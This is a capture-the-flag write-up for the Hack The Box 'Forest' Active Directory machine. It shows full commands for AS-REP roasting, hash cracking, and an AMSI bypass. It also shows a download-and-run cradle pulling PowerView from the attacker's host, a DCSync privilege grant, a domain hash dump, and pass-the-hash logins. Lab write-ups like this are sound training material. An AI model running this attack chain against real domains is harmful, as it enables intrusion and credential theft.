# Forest
## Information Gathering
#### Master List
- IP is 10.10.10.161
- Forest name is htb.local
	- dnsHostName: FOREST.htb.local
	- ldapServieName: htb.local:forest$@HTB.LOCAL
- tcp_5985_winrm-detection.txt and tcp_47001_winrm-detection.txt
	- WinRM was possibly detected running on tcp port 5985. Suggest checking manual commands
- tcp139/enum4linux.txt
	- Server allows sessions using username '', password ''
	- Lots of users and accounts. These are stored in /wordlists/users.txt
- Hash gained from ASREPRoasting. Cracked hash to get credentials **svc-alfresco:s3rvice**
	- Enumerate with above credentials
		- smbmap reveals three shares accessible: IPC$, NETLOGON, SYSVOL
- `crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --pass-pol`
	- Results display no Account Lockout Threshold. 
	- This may mean we can perform password spraying
- `impacket-GetADUsers -all -dc-ip 10.10.10.161 htb.local/svc-alfresco`
	- A majority of users that we have discovered have never logged on. The users that have last-login times
		- Administrator
		- sebastien
		- svc-alfresco
	- This may narrow our enumeration.

#### Ports/Services
x 53/tcp      domain?      
88/tcp      kerberos-sec 
135/tcp     msrpc        
? 139/tcp     netbios-ssn  
	Lots of information here (username, groups, objects, etc) to further enumeration.
? 389/tcp     ldap     
	Lots of information here in nmap scan
? 445/tcp     microsoft-ds 
	More information on user enumeration
x 464/tcp     kpasswd5?    
x 593/tcp     ncacn_http   
x 636/tcp     tcpwrapped   
? 3268/tcp    ldap         
3269/tcp    tcpwrapped   
x 5985/tcp    http         
? 9389/tcp    mc-nmf       
x 47001/tcp   http         
49664/tcp   msrpc        
49665/tcp   msrpc        
49666/tcp   msrpc        
49667/tcp   msrpc        
49671/tcp   msrpc        
49676/tcp   ncacn_http   
49677/tcp   msrpc        
49684/tcp   msrpc        
49703/tcp   msrpc        
49959/tcp   msrpc

#### Software
- Server OS: Windows Server 2016 Standard 6.3



## Enumeration
#### Nmap scan
```bash
PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain?      syn-ack ttl 127
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-26 22:58:09Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49703/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49959/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2022-07-26T16:06:23-07:00

```

From tcp139/enum4linux.txt we gain the following users:
- mark - Mark Brandt
- tahaa
- sebastien - Sebastien Caron
- lucinda - Lucinda Berger
- santi - Santi Rodriguez
- yoloswag
- Administrator
- svc-alfresco
- andy - Andy Hislip
- DefaultAccount - A user account managed by the system

I add these to a wordlist and verify if they exist on the DC using kerbrute
```bash
$ kerbrute_linux_amd64 userenum --dc 10.10.10.161 -d htb.local users.txt

2022/07/27 16:26:56 >  [+] VALID USERNAME:       Administrator@htb.local
2022/07/27 16:26:56 >  [+] VALID USERNAME:       lucinda@htb.local
2022/07/27 16:26:56 >  [+] VALID USERNAME:       sebastien@htb.local
2022/07/27 16:26:56 >  [+] VALID USERNAME:       andy@htb.local
2022/07/27 16:26:56 >  [+] VALID USERNAME:       santi@htb.local
2022/07/27 16:26:56 >  [+] VALID USERNAME:       mark@htb.local
2022/07/27 16:26:56 >  [+] VALID USERNAME:       svc-alfresco@htb.local
```
All of the accounts appear to be valid.

I next go for a low hanging fruit of ASREPRoasting. 
```bash
$ impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb.local/ -usersfile users.txt

$krb5asrep$23$svc-alfresco@HTB.LOCAL:dd7a9627235c72df75dcd2d446829f49$a4a1d88e86276428b5c00bfb6b13528f05388d07229b45dcc46ad28d803d109c94ce969b20b314e2cb3c022b26ea7c1b76c70e4c3283f88ea7487c10db8d1c0e9a4f37d71251706d269ef0e19f3293fdb3d1de0eff365f956d21da424818ecfd9a127df4903bf967a521df02463172e06e74435446be4ca5d5e3e0a2e83569038a4b33d48150e8f3720aff8e594dae87e507d167cb98a6559108a244b340a6393ed1b9b2ee996c7e8bbf83ce6a539aa801f60c1eb64e0524432a0b1121d6ee3d4c4cea947a13e9b03c5dbafa6110b5b35b525675744bf1601a564bc0f6f38642b870c2f52acd
```
This gives me a hash for svc-alfresco. 

I attempt to crack with JtR
```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
```

This gives me the credentials **svc-alfresco:s3rvice**

### Enumeration Using Credentials

With this, we can re-enumerate everything using the found credentials. I'll start basic and enumerate more if I need to.

```bash
$ smbmap -u 'svc-alfresco' -p 's3rvice' -P 445 -H 10.10.10.161
```
This gives us 3 READ ONLY shares: IPC$, NETLOGON, SYSVOL.

IPC$ throws an NT_STATUS_NO_SUCH_FILE listing error when trying to read from the working directory.

NETLOGON is empty.

SYSVOL actually gives us something to work with. Within SYSVOL are two "Policies":
- {31B2F340-016D-11D2-945F-00C04FB984F9} (31)
- {6AC1786C-016F-11D2-945F-00C04fB984F9} (6A)

Both have the same directory structure and both contain the files GPT.INI and GptTmpl.inf. Lastly, there is a directory I can't access called "DfsrPrivate"

The 31 GptTmpl.inf file comains a lot of information about User Right Assignments.
INF files are Setup Information Files which is used by Microsoft Windows for installation of software and drivers.

## Exploitation
After much time enumerating and reading I finally have gained foothold! During my flailing, I saw that 5985 is open! Because I have credentials I can probably authenticate using evil-winrm. 
```bash
$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
```

...I am an idiot....

## Privilege Escalation

### Enumeration
Some basic enumeration on Windows before I go into AD stuff
```
> hostname
FOREST

> whoami
htb\svc-alfresco
```

Some information on Administrator
```
> net user Administrator
User name                    Administrator
Full Name                    Administrator
Comment                      Built-in account for administering the computer/domain
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/30/2021 5:51:58 PM
Password expires             Never
Password changeable          8/31/2021 5:51:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/28/2022 4:29:34 PM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Enterprise Admins    *Organization Manageme
                             *Domain Users         *Group Policy Creator
                             *Domain Admins        *Schema Admins
The command completed successfully.
```

and svc-alfresco
```
> net user svc-alfresco

User name                    svc-alfresco
Full Name                    svc-alfresco
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/28/2022 6:44:18 PM
Password expires             Never
Password changeable          7/29/2022 6:44:18 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/28/2022 6:25:42 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Service Accounts
```

Trying out BloodHound for the first time
Start up the neo4j server
```bash
$ sudo neo4j console
```
I got the precompiled zip binary for both BloodHound and SharpHound.exe.
Running SharpHound.exe and transfering the zip file back for analysis
```bash
PS> .\SharpHound.exe
```

Some things to always check:
- All groups your current user is in. Some of these groups have vulnerabilities. [More info](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-accounts-and-token-privileges)
- Check the shortest route to domain admins. This will show you if there is any group mismanagement to your current user. 
- Shortest path to high value targets

In this instance svc-alfresco is a member of the [Account Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators) which can add and modify accounts. Account Operators has GenericAll permissions to the Exchange Windows Permissions Group which then has WriteDACL permissions to the domain. 

Because we have WriteDACL to the domain, you can grant yourself any privilege you want on an object. 

Create a new user. Don't forget to add them to the group we are going to abuse (Exchange Windows Permissions)
```cmd
PS> net user default password123 /add /domain
PS> net group "Exchange Windows Permissions" default /add
PS> net localgroup "Remote Management Users" default /add
```

Then dot source PowerView.ps1. The Bypass-4MSI command gives the ability to evade defender before importing a script.
```cmd
PS> menu
PS> Bypass-4MSI
PS> iex(new-object net.webclient).downloadstring('http://10.10.14.6/PowerView.ps1')
```

Then follow Bloodhounds suggested AV
```cmd
PS> $SecPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force
PS> $Cred = New-Object System.Management.Automation.PSCredential('htb\Default', $SecPassword)
PS> Add-ObjectACL -PrincipalIdentity Default -Credential $Cred -Rights DCSync
```

This'll give you a high privilege account which you can use to further enumerate the Domain Controller
Dump hashes:
```bash
$ impacket-secretsdump -just-dc default:password123@10.10.10.161
```
This gives you the Administrator Hash which allows you to perform Pass-the-Hash
```bash
$ evil-winrm -i 10.10.10.161 -u Adminstrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

You can do the same thing with impacket-psexec
```bash
$ impacket-psexec administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```